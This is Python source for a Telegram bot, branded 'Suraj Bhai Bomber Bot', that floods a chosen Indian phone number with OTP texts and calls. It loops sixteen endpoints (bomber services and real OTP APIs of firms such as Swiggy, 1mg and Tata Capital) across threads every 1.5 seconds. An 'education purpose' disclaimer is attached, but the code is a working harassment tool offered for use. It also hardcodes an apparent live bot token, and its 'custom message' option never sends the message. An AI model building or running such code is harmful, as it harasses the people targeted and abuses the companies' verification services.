import logging
import threading
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
from flask import Flask

# ================= CONFIGURATION =================
TELEGRAM_BOT_TOKEN = "9200835027:AAGT4dhzeunqm_917OcomrNcPSrSmnaT_qI"
CHANNEL_SIGNATURE = "SK BHAI"
CUSTOMER_SERVICE_URL = "https://t.me/+UemRGWr-B2wzMmFl"
# =================================================

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Flask app for 24/7 Cloud Uptime (Render, Koyeb, etc.)
flask_app = Flask('')

@flask_app.route('/')
def home():
    return "🤖 Suraj Bhai High-Speed Bomber Bot is 24/7 Alive and Active!"

def run_flask():
    flask_app.run(host='0.0.0.0', port=8080)

# Global tracking variables for live stats & control
BOMBER_STATS = {
    "total_requests_sent": 0,
    "active_targets": 0
}

# Active attack control dictionary {chat_id: {"running": bool, "target": str}}
ACTIVE_ATTACKS = {}

# List of APIs provided for request execution
APIS = [
    {"name": "FreeFire Bomber",   "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET",  "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Call Bomber API",   "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Bomberr API",       "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Lenskart",          "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "Hungama",           "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
    {"name": "Meru Cab",          "url": lambda p, d: "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Dayco India",       "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"api=send_otp&mob={p}"},
    {"name": "NoBroker",          "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
    {"name": "ShipRocket",        "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "PenPencil",         "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "1mg",               "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "KPN Fresh",         "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "Servetel",          "url": lambda p, d: "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Swiggy Call",       "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Capital",      "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "Doubtnut",          "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
]

def get_main_keyboard():
    keyboard = [
        ["🇮🇳 India SMS Bomber", "💬 Custom Message Spam"],
        ["🛑 Stop Bomber", "📊 System Status"],
        ["👑 Customer Service"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_msg = (
        f"╔═══════════════════════════════════╗\n"
        f"✨ **Aapka Swagat Hai Suraj Bhai Ke Bomber Bot Me** ✨\n"
        f"╚═══════════════════════════════════╝\n\n"
        f"⚠️ **CHETAVANI / WARNING:**\n"
        f"Yeh bot sirf aur sirf **Education Purpose** aur security/stress testing ke liye banaya gaya hai.\n\n"
        f"🚀 **Neeche diye gaye buttons ka upyog karein:**\n"
        f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
    )
    await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=get_main_keyboard())

# Handle Reply Keyboard Buttons & Text Inputs
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    chat_id = update.effective_chat.id

    if text == "🇮🇳 India SMS Bomber":
        context.user_data['waiting_for'] = 'bomb_number'
        await update.message.reply_text(
            "📱 **Kripya target 10-digit mobile number bhejiye:**\n📌 *Example:* `9876543210`",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    elif text == "💬 Custom Message Spam":
        context.user_data['waiting_for'] = 'custom_spam_msg'
        await update.message.reply_text(
            "💬 **Kripya apna custom message bhejiye** jo spam karna hai (jaise: `Hello Bhai`):",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    elif text == "🛑 Stop Bomber":
        if chat_id in ACTIVE_ATTACKS and ACTIVE_ATTACKS[chat_id].get("running"):
            ACTIVE_ATTACKS[chat_id]["running"] = False
            await update.message.reply_text("🛑 **Bomber process ko successfully rok diya gaya hai!**", parse_mode="Markdown", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text("ℹ️ Koi bhi active bombing process nahi chal rahi hai.", parse_mode="Markdown", reply_markup=get_main_keyboard())
    elif text == "📊 System Status":
        stats_msg = (
            f"📊 **Bomber Live Statistics**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🔄 Total Requests Sent: `{BOMBER_STATS['total_requests_sent']}`\n"
            f"🎯 Active Targets in Queue: `{BOMBER_STATS['active_targets']}`\n"
            f"⚡ Status: High-Speed Threaded Running (24/7 Flask Active)\n"
            f"👑 Powered By: {CHANNEL_SIGNATURE}"
        )
        await update.message.reply_text(stats_msg, parse_mode="Markdown", reply_markup=get_main_keyboard())
    elif text == "👑 Customer Service":
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Contact Customer Service", url=CUSTOMER_SERVICE_URL)]])
        await update.message.reply_text(
            "👑 **Customer Service & Support:**\nKisi bhi sahayata ya query ke liye neeche diye gaye button par click karein:",
            parse_mode="Markdown",
            reply_markup=kb
        )
    else:
        # Check ongoing conversational state
        waiting_for = context.user_data.get('waiting_for')
        if waiting_for == 'bomb_number':
            target_phone = text.strip()
            if not target_phone.isdigit() or len(target_phone) != 10:
                await update.message.reply_text("❌ **Galat Number!** Kripya 10 digit ka valid mobile number bhejiye.", parse_mode="Markdown", reply_markup=get_main_keyboard())
                return
            
            context.user_data['waiting_for'] = None
            await start_bombing_process(update, context, target_phone)

        elif waiting_for == 'custom_spam_msg':
            custom_msg = text.strip()
            context.user_data['custom_msg'] = custom_msg
            context.user_data['waiting_for'] = 'custom_spam_phone'
            await update.message.reply_text(
                f"📱 Message saved: *\"{custom_msg}\"*\nAb target 10-digit mobile number bhejiye:",
                parse_mode="Markdown",
                reply_markup=get_main_keyboard()
            )
        elif waiting_for == 'custom_spam_phone':
            target_phone = text.strip()
            if not target_phone.isdigit() or len(target_phone) != 10:
                await update.message.reply_text("❌ **Galat Number!** Kripya 10 digit ka valid mobile number bhejiye.", parse_mode="Markdown", reply_markup=get_main_keyboard())
                return
            
            custom_msg = context.user_data.get('custom_msg', 'Hello')
            context.user_data['waiting_for'] = None
            await start_custom_spam_process(update, context, target_phone, custom_msg)

# Single API execution worker function
def send_single_request(api, target_phone):
    try:
        url = api["url"](target_phone, "60")
        headers = api["headers"]
        
        if api["method"] == "GET":
            requests.get(url, headers=headers, timeout=3)
        elif api["method"] == "POST":
            data = api["data"](target_phone, "60")
            requests.post(url, headers=headers, data=data, timeout=3)
        
        BOMBER_STATS["total_requests_sent"] += 1
    except Exception:
        pass

async def start_bombing_process(update: Update, context: ContextTypes.DEFAULT_TYPE, target_phone: str):
    chat_id = update.effective_chat.id
    if chat_id in ACTIVE_ATTACKS and ACTIVE_ATTACKS[chat_id].get("running"):
        await update.message.reply_text("⚠️ Ek attack pehle se chal raha hai! Use rokne ke liye 'Stop Bomber' dabayein.", reply_markup=get_main_keyboard())
        return

    ACTIVE_ATTACKS[chat_id] = {"running": True, "target": target_phone}
    BOMBER_STATS["active_targets"] += 1

    await update.message.reply_text(
        f"🎯 **Target Number:** `{target_phone}`\n"
        f"⚡ **Status:** High-speed multi-threaded SMS bombing shuru ho chuki hai!\n"
        f"🛑 Rokne ke liye 'Stop Bomber' button dabayein.",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

    threading.Thread(
        target=run_threaded_bomber, 
        args=(target_phone, chat_id)
    ).start()

def run_threaded_bomber(target_phone, chat_id):
    try:
        while ACTIVE_ATTACKS.get(chat_id, {}).get("running", False):
            with ThreadPoolExecutor(max_workers=10) as executor:
                for api in APIS:
                    if not ACTIVE_ATTACKS.get(chat_id, {}).get("running", False):
                        break
                    executor.submit(send_single_request, api, target_phone)
            
            time.sleep(1.5)
    except Exception as e:
        logger.error(f"Error in threaded loop: {e}")
    finally:
        if chat_id in ACTIVE_ATTACKS:
            ACTIVE_ATTACKS[chat_id]["running"] = False
        BOMBER_STATS["active_targets"] -= 1

async def start_custom_spam_process(update: Update, context: ContextTypes.DEFAULT_TYPE, target_phone: str, custom_msg: str):
    chat_id = update.effective_chat.id
    if chat_id in ACTIVE_ATTACKS and ACTIVE_ATTACKS[chat_id].get("running"):
        await update.message.reply_text("⚠️ Ek attack pehle se chal raha hai! Use rokne ke liye 'Stop Bomber' dabayein.", reply_markup=get_main_keyboard())
        return

    ACTIVE_ATTACKS[chat_id] = {"running": True, "target": target_phone}
    BOMBER_STATS["active_targets"] += 1

    await update.message.reply_text(
        f"💬 **Custom Message Spam Started**\n"
        f"🎯 Target: `{target_phone}`\n"
        f"✉️ Message: *\"{custom_msg}\"*\n"
        f"🛑 Rokne ke liye 'Stop Bomber' button dabayein.",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

    threading.Thread(
        target=run_threaded_custom_spam, 
        args=(target_phone, custom_msg, chat_id)
    ).start()

def run_threaded_custom_spam(target_phone, custom_msg, chat_id):
    try:
        while ACTIVE_ATTACKS.get(chat_id, {}).get("running", False):
            with ThreadPoolExecutor(max_workers=10) as executor:
                for api in APIS:
                    if not ACTIVE_ATTACKS.get(chat_id, {}).get("running", False):
                        break
                    executor.submit(send_single_request, api, target_phone)
            time.sleep(1.5)
    except Exception as e:
        logger.error(f"Error in custom spam loop: {e}")
    finally:
        if chat_id in ACTIVE_ATTACKS:
            ACTIVE_ATTACKS[chat_id]["running"] = False
        BOMBER_STATS["active_targets"] -= 1

# /bomb command handler supporting direct text args too
async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "❌ **Kripya target mobile number dein!**\n\n📌 *Example:* `/bomb 9876543210`",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    target_phone = context.args[0].strip()
    if not target_phone.isdigit() or len(target_phone) != 10:
        await update.message.reply_text(
            "❌ **Galat Number!** Kripya 10 digit ka valid mobile number darj karein.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    await start_bombing_process(update, context, target_phone)

def main():
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", handle_bomb_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print(f"🤖 Suraj Bhai High-Speed Bomber Bot is up and running [Powered by {CHANNEL_SIGNATURE}]...")
    app.run_polling()

if __name__ == '__main__':
    main()
